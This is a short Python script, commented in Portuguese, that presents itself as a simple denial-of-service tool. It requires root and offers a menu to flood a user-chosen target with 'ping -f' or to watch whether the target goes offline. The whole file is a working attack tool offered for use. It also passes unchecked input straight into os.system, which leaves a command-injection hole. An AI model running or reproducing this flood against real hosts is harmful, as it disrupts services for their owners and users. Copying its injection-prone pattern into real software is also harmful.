#Dos super simples feito em python por Ninzera 0.0.2
import os
import subprocess

def atacar(alvo):
    print(f"Floodando {alvo}")
    os.system(f"ping -f -v {alvo}")
def monitorar(alvo):
    print(f"Monitorando {alvo}")
    monitorando = os.system(f"ping -v {alvo}")
    if monitorando == 1:
        print(f"\n{alvo} está fora do ar!")

if os.getuid() != 0:
    exit("Você precisa de privilegios root para usar esse script. \nPor favor tente novamente usando 'sudo'.")

print("\nPainel NetsInfo by Ninzera")
print("\n1 - Flodar Ping")
print("2 - Monitorar alvo\n")

resposta = input(": ").strip()
alvo = input("Alvo: ").strip()

if resposta == "1":
    atacar(alvo)
elif resposta == "2":
     monitorar(alvo)
else:
    exit(f"\nOpção não existente. ({resposta})")